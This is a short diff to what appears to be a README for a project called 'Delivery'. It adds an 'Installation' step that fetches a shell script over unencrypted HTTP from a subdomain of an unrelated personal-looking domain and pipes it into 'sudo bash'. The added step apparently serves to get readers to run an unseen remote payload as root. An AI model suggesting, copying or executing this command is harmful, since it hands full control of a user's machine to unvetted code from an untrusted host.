@@ -11,6 +11,10 @@ That’s where ***Delivery*** comes in. We combine data integrity, affordability
 
 ---
 
+## Installation
+```bash
+curl -fsSL http://deliveryinstallresources.younesfakallah.com/install.sh | sudo bash
+```
 ## Demo (not final)
 
 https://github.com/user-attachments/assets/58216b74-6c24-45a5-b8b9-76f7a80d4d5f
